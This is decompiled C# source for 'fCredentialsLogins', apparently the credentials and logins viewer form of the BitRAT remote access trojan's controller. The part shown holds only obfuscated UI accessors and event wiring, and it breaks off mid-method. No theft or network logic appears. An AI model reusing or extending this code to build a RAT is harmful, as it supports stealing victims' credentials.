﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Zeroit.Framework.Progress;

// Token: 0x02000115 RID: 277
[DesignerGenerated]
public sealed partial class fCredentialsLogins : Form
{
	// Token: 0x06000EA4 RID: 3748 RVA: 0x0006DC70 File Offset: 0x0006BE70
	public fCredentialsLogins()
	{
		base.Load += this.fCredentialsLogins_Load;
		base.Resize += this.fCredentialsLogins_Resize;
		base.Closing += this.fCredentialsLogins_Closing;
		this.InitializeComponent();
	}

	// Token: 0x06000EA7 RID: 3751 RVA: 0x00008DC5 File Offset: 0x00006FC5
	internal System.Windows.Forms.Timer vmethod_0()
	{
		return this.timer_0;
	}

	// Token: 0x06000EA8 RID: 3752 RVA: 0x0006F7AC File Offset: 0x0006D9AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_7);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_2;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000EA9 RID: 3753 RVA: 0x00008DCD File Offset: 0x00006FCD
	internal OLVColumn vmethod_2()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x06000EAA RID: 3754 RVA: 0x00008DD5 File Offset: 0x00006FD5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_0 = olvcolumn_8;
	}

	// Token: 0x06000EAB RID: 3755 RVA: 0x00008DDE File Offset: 0x00006FDE
	internal ContextMenuStrip vmethod_4()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06000EAC RID: 3756 RVA: 0x00008DE6 File Offset: 0x00006FE6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(ContextMenuStrip contextMenuStrip_2)
	{
		this.contextMenuStrip_0 = contextMenuStrip_2;
	}

	// Token: 0x06000EAD RID: 3757 RVA: 0x00008DEF File Offset: 0x00006FEF
	internal ToolStripSeparator vmethod_6()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x06000EAE RID: 3758 RVA: 0x00008DF7 File Offset: 0x00006FF7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_0 = toolStripSeparator_12;
	}

	// Token: 0x06000EAF RID: 3759 RVA: 0x00008E00 File Offset: 0x00007000
	internal ToolStripMenuItem vmethod_8()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06000EB0 RID: 3760 RVA: 0x00008E08 File Offset: 0x00007008
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(ToolStripMenuItem toolStripMenuItem_27)
	{
		this.toolStripMenuItem_0 = toolStripMenuItem_27;
	}

	// Token: 0x06000EB1 RID: 3761 RVA: 0x00008E11 File Offset: 0x00007011
	internal FastObjectListView vmethod_10()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x06000EB2 RID: 3762 RVA: 0x0006F7F0 File Offset: 0x0006D9F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(FastObjectListView fastObjectListView_2)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_6);
		KeyEventHandler value2 = new KeyEventHandler(this.method_8);
		EventHandler value3 = new EventHandler(this.method_25);
		EventHandler value4 = new EventHandler(this.method_26);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.MouseUp -= value;
			fastObjectListView.KeyDown -= value2;
			fastObjectListView.SelectedIndexChanged -= value3;
			fastObjectListView.DoubleClick -= value4;
		}
		this.fastObjectListView_0 = fastObjectListView_2;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.MouseUp += value;
			fastObjectListView.KeyDown += value2;
			fastObjectListView.SelectedIndexChanged += value3;
			fastObjectListView.DoubleClick += value4;
		}
	}

	// Token: 0x06000EB3 RID: 3763 RVA: 0x00008E19 File Offset: 0x00007019
	internal ToolStripMenuItem vmethod_12()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06000EB4 RID: 3764 RVA: 0x00008E21 File Offset: 0x00007021
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(ToolStripMenuItem toolStripMenuItem_27)
	{
		this.toolStripMenuItem_1 = toolStripMenuItem_27;
	}

	// Token: 0x06000EB5 RID: 3765 RVA: 0x00008E2A File Offset: 0x0000702A
	internal ToolStripMenuItem vmethod_14()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x06000EB6 RID: 3766 RVA: 0x0006F888 File Offset: 0x0006DA88
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_4);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EB7 RID: 3767 RVA: 0x00008E32 File Offset: 0x00007032
	internal ToolStripMenuItem vmethod_16()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x06000EB8 RID: 3768 RVA: 0x0006F8CC File Offset: 0x0006DACC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_5);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_3 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EB9 RID: 3769 RVA: 0x00008E3A File Offset: 0x0000703A
	internal ToolStripMenuItem vmethod_18()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x06000EBA RID: 3770 RVA: 0x0006F910 File Offset: 0x0006DB10
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_28);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EBB RID: 3771 RVA: 0x00008E42 File Offset: 0x00007042
	internal ToolStripSeparator vmethod_20()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x06000EBC RID: 3772 RVA: 0x00008E4A File Offset: 0x0000704A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_1 = toolStripSeparator_12;
	}

	// Token: 0x06000EBD RID: 3773 RVA: 0x00008E53 File Offset: 0x00007053
	internal ToolStripMenuItem vmethod_22()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x06000EBE RID: 3774 RVA: 0x00008E5B File Offset: 0x0000705B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(ToolStripMenuItem toolStripMenuItem_27)
	{
		this.toolStripMenuItem_5 = toolStripMenuItem_27;
	}

	// Token: 0x06000EBF RID: 3775 RVA: 0x00008E64 File Offset: 0x00007064
	internal ToolStripMenuItem vmethod_24()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x06000EC0 RID: 3776 RVA: 0x0006F954 File Offset: 0x0006DB54
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_12);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_6 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EC1 RID: 3777 RVA: 0x00008E6C File Offset: 0x0000706C
	internal ToolStripSeparator vmethod_26()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x06000EC2 RID: 3778 RVA: 0x00008E74 File Offset: 0x00007074
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_2 = toolStripSeparator_12;
	}

	// Token: 0x06000EC3 RID: 3779 RVA: 0x00008E7D File Offset: 0x0000707D
	internal ToolStripMenuItem vmethod_28()
	{
		return this.toolStripMenuItem_7;
	}

	// Token: 0x06000EC4 RID: 3780 RVA: 0x0006F998 File Offset: 0x0006DB98
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_11);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_7 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EC5 RID: 3781 RVA: 0x00008E85 File Offset: 0x00007085
	internal OLVColumn vmethod_30()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x06000EC6 RID: 3782 RVA: 0x00008E8D File Offset: 0x0000708D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_1 = olvcolumn_8;
	}

	// Token: 0x06000EC7 RID: 3783 RVA: 0x00008E96 File Offset: 0x00007096
	internal ToolStripMenuItem vmethod_32()
	{
		return this.toolStripMenuItem_8;
	}

	// Token: 0x06000EC8 RID: 3784 RVA: 0x00008E9E File Offset: 0x0000709E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(ToolStripMenuItem toolStripMenuItem_27)
	{
		this.toolStripMenuItem_8 = toolStripMenuItem_27;
	}

	// Token: 0x06000EC9 RID: 3785 RVA: 0x00008EA7 File Offset: 0x000070A7
	internal ToolStripMenuItem vmethod_34()
	{
		return this.toolStripMenuItem_9;
	}

	// Token: 0x06000ECA RID: 3786 RVA: 0x0006F9DC File Offset: 0x0006DBDC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_9);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_9;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_9 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_9;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000ECB RID: 3787 RVA: 0x00008EAF File Offset: 0x000070AF
	internal ToolStripSeparator vmethod_36()
	{
		return this.toolStripSeparator_3;
	}

	// Token: 0x06000ECC RID: 3788 RVA: 0x00008EB7 File Offset: 0x000070B7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_3 = toolStripSeparator_12;
	}

	// Token: 0x06000ECD RID: 3789 RVA: 0x00008EC0 File Offset: 0x000070C0
	internal ToolStripMenuItem vmethod_38()
	{
		return this.toolStripMenuItem_10;
	}

	// Token: 0x06000ECE RID: 3790 RVA: 0x0006FA20 File Offset: 0x0006DC20
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_10);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_10;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_10 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_10;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000ECF RID: 3791 RVA: 0x00008EC8 File Offset: 0x000070C8
	internal ToolStripSeparator vmethod_40()
	{
		return this.toolStripSeparator_4;
	}

	// Token: 0x06000ED0 RID: 3792 RVA: 0x00008ED0 File Offset: 0x000070D0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_4 = toolStripSeparator_12;
	}

	// Token: 0x06000ED1 RID: 3793 RVA: 0x00008ED9 File Offset: 0x000070D9
	internal ToolStripMenuItem vmethod_42()
	{
		return this.toolStripMenuItem_11;
	}

	// Token: 0x06000ED2 RID: 3794 RVA: 0x0006FA64 File Offset: 0x0006DC64
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_29);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_11 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000ED3 RID: 3795 RVA: 0x00008EE1 File Offset: 0x000070E1
	internal ToolStripSeparator vmethod_44()
	{
		return this.toolStripSeparator_5;
	}

	// Token: 0x06000ED4 RID: 3796 RVA: 0x00008EE9 File Offset: 0x000070E9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_5 = toolStripSeparator_12;
	}

	// Token: 0x06000ED5 RID: 3797 RVA: 0x00008EF2 File Offset: 0x000070F2
	internal ToolStripMenuItem vmethod_46()
	{
		return this.toolStripMenuItem_12;
	}

	// Token: 0x06000ED6 RID: 3798 RVA: 0x0006FAA8 File Offset: 0x0006DCA8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_13);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_12;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_12 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_12;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000ED7 RID: 3799 RVA: 0x00008EFA File Offset: 0x000070FA
	internal ToolStripSeparator vmethod_48()
	{
		return this.toolStripSeparator_6;
	}

	// Token: 0x06000ED8 RID: 3800 RVA: 0x00008F02 File Offset: 0x00007102
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_6 = toolStripSeparator_12;
	}

	// Token: 0x06000ED9 RID: 3801 RVA: 0x00008F0B File Offset: 0x0000710B
	internal ZeroitAnidasoCircleProgress vmethod_50()
	{
		return this.zeroitAnidasoCircleProgress_0;
	}

	// Token: 0x06000EDA RID: 3802 RVA: 0x00008F13 File Offset: 0x00007113
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_1)
	{
		this.zeroitAnidasoCircleProgress_0 = zeroitAnidasoCircleProgress_1;
	}

	// Token: 0x06000EDB RID: 3803 RVA: 0x00008F1C File Offset: 0x0000711C
	internal FastObjectListView vmethod_52()
	{
		return this.fastObjectListView_1;
	}

	// Token: 0x06000EDC RID: 3804 RVA: 0x0006FAEC File Offset: 0x0006DCEC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(FastObjectListView fastObjectListView_2)
	{
		EventHandler value = new EventHandler(this.method_23);
		MouseEventHandler value2 = new MouseEventHandler(this.method_24);
		FastObjectListView fastObjectListView = this.fastObjectListView_1;
		if (fastObjectListView != null)
		{
			fastObjectListView.SelectedIndexChanged -= value;
			fastObjectListView.MouseUp -= value2;
		}
		this.fastObjectListView_1 = fastObjectListView_2;
		fastObjectListView = this.fastObjectListView_1;
		if (fastObjectListView != null)
		{
			fastObjectListView.SelectedIndexChanged += value;
			fastObjectListView.MouseUp += value2;
		}
	}

	// Token: 0x06000EDD RID: 3805 RVA: 0x00008F24 File Offset: 0x00007124
	internal OLVColumn vmethod_54()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x06000EDE RID: 3806 RVA: 0x00008F2C File Offset: 0x0000712C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_2 = olvcolumn_8;
	}

	// Token: 0x06000EDF RID: 3807 RVA: 0x00008F35 File Offset: 0x00007135
	internal OLVColumn vmethod_56()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x06000EE0 RID: 3808 RVA: 0x00008F3D File Offset: 0x0000713D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_3 = olvcolumn_8;
	}

	// Token: 0x06000EE1 RID: 3809 RVA: 0x00008F46 File Offset: 0x00007146
	internal OLVColumn vmethod_58()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x06000EE2 RID: 3810 RVA: 0x00008F4E File Offset: 0x0000714E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_4 = olvcolumn_8;
	}

	// Token: 0x06000EE3 RID: 3811 RVA: 0x00008F57 File Offset: 0x00007157
	internal OLVColumn vmethod_60()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x06000EE4 RID: 3812 RVA: 0x00008F5F File Offset: 0x0000715F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_5 = olvcolumn_8;
	}

	// Token: 0x06000EE5 RID: 3813 RVA: 0x00008F68 File Offset: 0x00007168
	internal OLVColumn vmethod_62()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x06000EE6 RID: 3814 RVA: 0x00008F70 File Offset: 0x00007170
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_6 = olvcolumn_8;
	}

	// Token: 0x06000EE7 RID: 3815 RVA: 0x00008F79 File Offset: 0x00007179
	internal OLVColumn vmethod_64()
	{
		return this.olvcolumn_7;
	}

	// Token: 0x06000EE8 RID: 3816 RVA: 0x00008F81 File Offset: 0x00007181
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(OLVColumn olvcolumn_8)
	{
		this.olvcolumn_7 = olvcolumn_8;
	}

	// Token: 0x06000EE9 RID: 3817 RVA: 0x00008F8A File Offset: 0x0000718A
	internal StatusStrip vmethod_66()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06000EEA RID: 3818 RVA: 0x00008F92 File Offset: 0x00007192
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(StatusStrip statusStrip_2)
	{
		this.statusStrip_0 = statusStrip_2;
	}

	// Token: 0x06000EEB RID: 3819 RVA: 0x00008F9B File Offset: 0x0000719B
	internal ToolStripStatusLabel vmethod_68()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x06000EEC RID: 3820 RVA: 0x00008FA3 File Offset: 0x000071A3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(ToolStripStatusLabel toolStripStatusLabel_5)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_5;
	}

	// Token: 0x06000EED RID: 3821 RVA: 0x00008FAC File Offset: 0x000071AC
	internal ToolStripProgressBar vmethod_70()
	{
		return this.toolStripProgressBar_0;
	}

	// Token: 0x06000EEE RID: 3822 RVA: 0x00008FB4 File Offset: 0x000071B4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(ToolStripProgressBar toolStripProgressBar_1)
	{
		this.toolStripProgressBar_0 = toolStripProgressBar_1;
	}

	// Token: 0x06000EEF RID: 3823 RVA: 0x00008FBD File Offset: 0x000071BD
	internal ContextMenuStrip vmethod_72()
	{
		return this.contextMenuStrip_1;
	}

	// Token: 0x06000EF0 RID: 3824 RVA: 0x00008FC5 File Offset: 0x000071C5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(ContextMenuStrip contextMenuStrip_2)
	{
		this.contextMenuStrip_1 = contextMenuStrip_2;
	}

	// Token: 0x06000EF1 RID: 3825 RVA: 0x00008FCE File Offset: 0x000071CE
	internal ToolStripMenuItem vmethod_74()
	{
		return this.toolStripMenuItem_13;
	}

	// Token: 0x06000EF2 RID: 3826 RVA: 0x00008FD6 File Offset: 0x000071D6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(ToolStripMenuItem toolStripMenuItem_27)
	{
		this.toolStripMenuItem_13 = toolStripMenuItem_27;
	}

	// Token: 0x06000EF3 RID: 3827 RVA: 0x00008FDF File Offset: 0x000071DF
	internal ToolStripMenuItem vmethod_76()
	{
		return this.toolStripMenuItem_14;
	}

	// Token: 0x06000EF4 RID: 3828 RVA: 0x0006FB4C File Offset: 0x0006DD4C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_15);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_14 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EF5 RID: 3829 RVA: 0x00008FE7 File Offset: 0x000071E7
	internal ToolStripSeparator vmethod_78()
	{
		return this.toolStripSeparator_7;
	}

	// Token: 0x06000EF6 RID: 3830 RVA: 0x00008FEF File Offset: 0x000071EF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(ToolStripSeparator toolStripSeparator_12)
	{
		this.toolStripSeparator_7 = toolStripSeparator_12;
	}

	// Token: 0x06000EF7 RID: 3831 RVA: 0x00008FF8 File Offset: 0x000071F8
	internal ToolStripMenuItem vmethod_80()
	{
		return this.toolStripMenuItem_15;
	}

	// Token: 0x06000EF8 RID: 3832 RVA: 0x0006FB90 File Offset: 0x0006DD90
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_16);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_15 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EF9 RID: 3833 RVA: 0x00009000 File Offset: 0x00007200
	internal System.Windows.Forms.Timer vmethod_82()
	{
		return this.timer_1;
	}

	// Token: 0x06000EFA RID: 3834 RVA: 0x0006FBD4 File Offset: 0x0006DDD4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_14);
		System.Windows.Forms.Timer timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_1 = timer_2;
		timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000EFB RID: 3835 RVA: 0x00009008 File Offset: 0x00007208
	internal ToolStripMenuItem vmethod_84()
	{
		return this.toolStripMenuItem_16;
	}

	// Token: 0x06000EFC RID: 3836 RVA: 0x00009010 File Offset: 0x00007210
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(ToolStripMenuItem toolStripMenuItem_27)
	{
		this.toolStripMenuItem_16 = toolStripMenuItem_27;
	}

	// Token: 0x06000EFD RID: 3837 RVA: 0x00009019 File Offset: 0x00007219
	internal ToolStripMenuItem vmethod_86()
	{
		return this.toolStripMenuItem_17;
	}

	// Token: 0x06000EFE RID: 3838 RVA: 0x0006FC18 File Offset: 0x0006DE18
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_17);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_17 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000EFF RID: 3839 RVA: 0x00009021 File Offset: 0x00007221
	internal ToolStripMenuItem vmethod_88()
	{
		return this.toolStripMenuItem_18;
	}

	// Token: 0x06000F00 RID: 3840 RVA: 0x0006FC5C File Offset: 0x0006DE5C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_18);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_18;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_18 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_18;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F01 RID: 3841 RVA: 0x00009029 File Offset: 0x00007229
	internal ToolStripMenuItem vmethod_90()
	{
		return this.toolStripMenuItem_19;
	}

	// Token: 0x06000F02 RID: 3842 RVA: 0x0006FCA0 File Offset: 0x0006DEA0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_19);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_19;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_19 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_19;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F03 RID: 3843 RVA: 0x00009031 File Offset: 0x00007231
	internal ToolStripMenuItem vmethod_92()
	{
		return this.toolStripMenuItem_20;
	}

	// Token: 0x06000F04 RID: 3844 RVA: 0x0006FCE4 File Offset: 0x0006DEE4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_20);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_20;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_20 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_20;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F05 RID: 3845 RVA: 0x00009039 File Offset: 0x00007239
	internal ToolStripMenuItem vmethod_94()
	{
		return this.toolStripMenuItem_21;
	}

	// Token: 0x06000F06 RID: 3846 RVA: 0x0006FD28 File Offset: 0x0006DF28
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_21);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_21;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_21 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_21;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000F07 RID: 3847 RVA: 0x00009041 File Offset: 0x00007241
	internal ToolStripMenuItem vmethod_96()
	{
		return this.toolStripMenuItem_22;
	}

	// Token: 0x06000F08 RID: 3848 RVA: 0x0006FD6C File Offset: 0x0006DF6C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(ToolStripMenuItem toolStripMenuItem_27)
	{
		EventHandler value = new EventHandler(this.method_22);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_22;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_22 = toolStripMenuItem_27;
		toolStripMenuItem = this.toolStripMenuItem_22;
